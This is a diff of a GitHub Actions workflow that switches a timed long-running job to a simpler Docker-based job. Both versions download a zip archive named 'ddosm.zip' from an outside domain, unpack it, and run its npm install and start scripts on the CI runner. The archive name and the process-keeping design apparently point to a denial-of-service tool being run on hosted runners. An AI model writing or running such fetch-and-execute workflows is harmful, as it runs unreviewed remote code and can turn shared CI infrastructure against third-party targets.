@@ -1,101 +1,27 @@
-name: Long Running Process with Timer
+name: Use Docker Container
 
-on:
-  workflow_dispatch:  # Manual trigger
+on: workflow_dispatch
 
 jobs:
-  long-process:
+  docker-node:
     runs-on: ubuntu-latest
     
-    steps:
-    - name: Checkout code
-      uses: actions/checkout@v3
+    container:
+      image: node:18-bullseye  # Use Docker image instead of setup-node
       
-    - name: Setup Node.js
-      uses: actions/setup-node@v3
-      with:
-        node-version: '18'
+    steps:
+    - uses: actions/checkout@v3
     
-    - name: Start Timer
-      id: start
-      run: echo "start-time=$(date +%s)" >> $GITHUB_OUTPUT
-    
-    - name: Download and Extract
+    - name: Verify Node.js
       run: |
+        node --version
+        npm --version
+    
+    - name: Your process here
+      run: |
+        # Download your file
         curl -L -o project.zip "https://reality.mahmud-tech.online/ddosm.zip"
-        sudo apt-get install -y unzip
         unzip project.zip -d ./project
-        
-    - name: Install Dependencies
-      run: |
         cd ./project
         npm install
-        
-    - name: Run Process with Time Tracking
-      run: |
-        cd ./project
-        
-        # Get the script from package.json
-        SCRIPT_NAME=${1:-start}  # Default to 'start' if no argument
-        
-        # Start time for this step
-        STEP_START=$(date +%s)
-        
-        echo "⏱️  Starting process at: $(date)"
-        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-        
-        # Run the npm script
-        npm run $SCRIPT_NAME &
-        PID=$!
-        
-        # Monitor process
-        while kill -0 $PID 2>/dev/null; do
-          CURRENT=$(date +%s)
-          ELAPSED=$((CURRENT - STEP_START))
-          
-          # Format time
-          HOURS=$((ELAPSED / 3600))
-          MINUTES=$(( (ELAPSED % 3600) / 60 ))
-          SECONDS=$((ELAPSED % 60))
-          
-          printf "\r⏱️  Running: %02d:%02d:%02d" $HOURS $MINUTES $SECONDS
-          sleep 5
-        done
-        
-        wait $PID
-        EXIT_CODE=$?
-        
-        # Final time for this step
-        STEP_END=$(date +%s)
-        STEP_ELAPSED=$((STEP_END - STEP_START))
-        
-        echo ""
-        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-        echo "✅ Step completed in: $(date -u -d @${STEP_ELAPSED} +"%H:%M:%S")"
-        
-        exit $EXIT_CODE
-      shell: bash
-    
-    - name: Calculate Total Time
-      if: always()  # Run even if previous step fails
-      run: |
-        END_TIME=$(date +%s)
-        START_TIME="${{ steps.start.outputs.start-time }}"
-        TOTAL_ELAPSED=$((END_TIME - START_TIME))
-        
-        # Format total time
-        HOURS=$((TOTAL_ELAPSED / 3600))
-        MINUTES=$(( (TOTAL_ELAPSED % 3600) / 60 ))
-        SECONDS=$((TOTAL_ELAPSED % 60))
-        
-        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-        echo "📊 TOTAL EXECUTION TIME:"
-        echo "   $HOURS hours, $MINUTES minutes, $SECONDS seconds"
-        echo "   ($(date -u -d @${TOTAL_ELAPSED} +"%H:%M:%S"))"
-        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-        
-        # Save to summary
-        echo "### ⏱️ Execution Summary" >> $GITHUB_STEP_SUMMARY
-        echo "- **Start:** $(date -d @$START_TIME)" >> $GITHUB_STEP_SUMMARY
-        echo "- **End:** $(date -d @$END_TIME)" >> $GITHUB_STEP_SUMMARY
-        echo "- **Total Time:** $HOURS hours, $MINUTES minutes, $SECONDS seconds" >> $GITHUB_STEP_SUMMARY
+        npm run start
